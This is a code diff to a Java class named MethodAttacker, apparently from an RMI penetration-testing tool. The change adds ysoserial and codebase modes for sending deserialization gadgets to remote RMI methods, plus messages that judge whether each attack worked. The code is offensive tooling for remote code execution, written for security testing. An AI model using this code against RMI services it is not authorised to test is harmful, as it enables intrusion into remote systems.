@@ -50,18 +50,8 @@ public class MethodAttacker {
         }
     }
 
-    public void attack(Object gadget)
-    {
-        attack(gadget, null, 0);
-    }
-
-    public void attack(Object gadget, String boundName)
-    {
-        attack(gadget, boundName, 0);
-    }
-
     @SuppressWarnings({ "rawtypes", "deprecation" })
-    public void attack(Object gadget, String boundName, int argumentPosition)
+    public void attack(Object gadget, String boundName, int argumentPosition, String mode)
     {
         Logger.printlnMixedYellow("Attacking", this.targetMethod.getSignature());
 
@@ -89,20 +79,20 @@ public class MethodAttacker {
                 RMGUtils.exit();
             }
 
-            if( attackArgument == 0 ) {
+            if( attackArgument == -1 ) {
                 Logger.eprintlnMixedYellow("No non primitive arguments were found for method signature", this.targetMethod.getSignature(), ".");
                 Logger.eprintln("Cannot continue from here");
                 System.exit(1);
             }
 
-            Logger.printlnMixedYellow("Found non primitive argument on position", String.valueOf(attackArgument), ".");
+            Logger.printlnMixedYellow("Found non primitive argument on position", String.valueOf(attackArgument));
 
             Remote instance = null;
             Class remoteClass = null;
             RemoteRef remoteRef = null;
 
             try {
-                remoteClass = RMGUtils.makeInterface(className, this.targetMethod.getSignature());
+                remoteClass = RMGUtils.makeInterface(className, this.targetMethod);
             } catch(CannotCompileException e) {
                 Logger.eprintlnMixedYellow("Caught", "CannotCompileException", "during interface creation.");
                 Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
@@ -117,7 +107,7 @@ public class MethodAttacker {
                 remoteRef = ref.getRef();
 
             } catch( Exception e ) {
-                Logger.eprintlnMixedYellow("Error: Unable to get instance for", name, ".");
+                Logger.eprintlnMixedYellow("Error: Unable to get instance for", name);
                 Logger.eprintlnMixedYellow("The following exception was caught:", e.getMessage());
                 Logger.decreaseIndent();
                 continue;
@@ -159,6 +149,8 @@ public class MethodAttacker {
 
             try {
                 remoteRef.invoke(instance, attackMethod, methodArguments, this.targetMethod.getHash());
+                Logger.eprintln("Remote method invocation didn't cause any exception.");
+                Logger.eprintln("This is unusual and the attack probably didn't work.");
 
             } catch (java.rmi.ServerException e) {
 
@@ -168,22 +160,63 @@ public class MethodAttacker {
                     continue;
 
                 } else if( cause instanceof java.lang.ClassNotFoundException ) {
+
                     Logger.printlnMixedBlue("Caught", "ClassNotFoundException", "during deserialization attack.");
-
                     String exceptionMessage = e.getMessage();
-                    if( exceptionMessage.contains(randomInstance.getClass().getName())) {
-                        Logger.printlnYellow("Deserialization attack most likely worked :)");
 
-                    } else {
-                        Logger.eprintlnYellow("Deserialization attack probably failed.");
-                        Logger.eprintln("StackTrace:");
-                        e.printStackTrace();
+                    if( mode.equals("ysoserial") ) {
+
+                        if( exceptionMessage.contains(randomInstance.getClass().getName())) {
+                            Logger.printlnYellow("Deserialization attack most likely worked :)");
+
+                        } else {
+                            Logger.eprintlnYellow("Deserialization attack probably failed.");
+                            Logger.eprintln("StackTrace:");
+                            e.printStackTrace();
+                        }
                     }
+
+                    else if( mode.equals("codebase") ) {
+
+                        if( exceptionMessage.contains("RMI class loader disabled") ) {
+                            Logger.eprintlnYellow("Codebase attack failed.");
+                            Logger.eprintlnMixedYellow("RMI class loader is", "disabled");
+                        }
+
+                        else if( exceptionMessage.contains(gadget.getClass().getName()) ) {
+                            Logger.printlnYellow("Target should be vulnerable to codebase attacks.");
+                            Logger.eprintlnMixedYellow("However, class could", "not be loaded", "from the specified remote endpoint.");
+                        }
+
+                        else if( exceptionMessage.contains(randomInstance.getClass().getName()) ) {
+                            Logger.printlnMixedYellow("Remote class loader attempted to load dummy class", randomInstance.getClass().getName());
+                            Logger.printlnMixedYellow("Attack", "probably worked");
+
+                            Logger.increaseIndent();
+                            Logger.eprintlnMixedYellow("If you got no callback, loading the attack class", gadget.getClass().getName(), "was skipped.");
+                            Logger.eprintln("This could be either if the class is known by the server or it was already loaded before.");
+                            Logger.eprintln("In this case, you should try a different classname");
+                            Logger.decreaseIndent();
+
+                        } else {
+                            Logger.eprintlnMixedYellow("Caught", "ClassNotFoundException", "with unexpected content.");
+                            RMGUtils.stackTrace(e);
+                        }
+                    }
+
+                } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
+                    Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), "during " + mode + " attack.");
+                    Logger.eprintln("This is usually caused by providing incompatible classes during codebase attacks.");
+                    RMGUtils.stackTrace(e);
+
+                } else {
+                    Logger.eprintlnMixedYellow("Caught", "java.rmi.ServerException", "with unknown cause.");
+                    RMGUtils.stackTrace(e);
                 }
-            } catch ( Exception e ) {
-                Logger.eprintlnYellow("Caught unexpected Exception during deserialization attack.");
-                Logger.eprintln("StackTrace:");
-                e.printStackTrace();
+
+            } catch( Exception e ) {
+                Logger.eprintlnYellow("Caught unexpected Exception during " + mode + " attack.");
+                RMGUtils.stackTrace(e);
                 continue;
 
             } finally {
